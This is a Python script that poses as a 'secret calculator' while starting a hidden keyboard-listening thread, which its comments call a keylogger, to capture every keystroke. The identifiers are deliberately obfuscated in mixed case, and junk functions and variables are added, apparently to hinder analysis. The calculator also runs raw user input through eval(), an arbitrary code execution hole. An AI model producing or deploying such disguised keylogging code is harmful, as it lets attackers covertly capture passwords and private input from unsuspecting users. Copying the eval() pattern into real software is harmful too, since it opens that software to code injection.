from pynput.keyboard import Listener
from threading import Thread
import random
import string

# Garbage data and random functions
def gArBage1():
    return [random.randint(0, 100) for _ in range(10)]

def gArBage2(x):
    return ''.join(random.choice(string.ascii_letters) for _ in range(x))

useless_variable_1 = gArBage1()
useless_variable_2 = gArBage2(5)

# Function to handle key press event
def ObFuScAtEd_keY_pReSs_HaNdLeR(oBfUsKeY):
    try:
        print(f"Key pressed: {oBfUsKeY.char}")
    except AttributeError:
        print(f"Special key pressed: {oBfUsKeY}")

# Another garbage function
def garbage3():
    return sum(random.randint(0, 10) for _ in range(100))

# Function to start listening to the keyboard
def StArT_kEyLoGgEr():
    with Listener(on_press=ObFuScAtEd_keY_pReSs_HaNdLeR) as gArbLiSt:
        gArbLiSt.join()

# Extra layer of indirection for no reason
def rAnDoM_cAlC():
    print("Calculating...")
    return cAlCuLaToR()

def cAlCuLaToR():
    print("sUpEr SeCrEt CalCuLatOr")
    print("Enter 'exit' to quit.")
    while True:
        useless_var_3 = garbage3()
        try:
            uSeRlEsS_vAr4 = input("Enter an expression (e.g., 2 + 2): ")
            if uSeRlEsS_vAr4.lower() == 'exit':
                print("Exiting calculator...")
                break
            rEsUlT = eval(uSeRlEsS_vAr4)
            print(f"Result: {rEsUlT}")
        except Exception as uSeLeSs_eXcEpTiOn:
            print(f"Error: {uSeLeSs_eXcEpTiOn}")

if __name__ == "__main__":
    # Garbage values for no reason
    garb_var_1 = [random.random() for _ in range(5)]
    garb_var_2 = {i: chr(i + 65) for i in range(5)}

    # Run the keylogger in the background while the calculator is active
    oBf_tHrEaD = Thread(target=StArT_kEyLoGgEr, daemon=True)
    oBf_tHrEaD.start()

    # Start the calculator
    rAnDoM_cAlC()
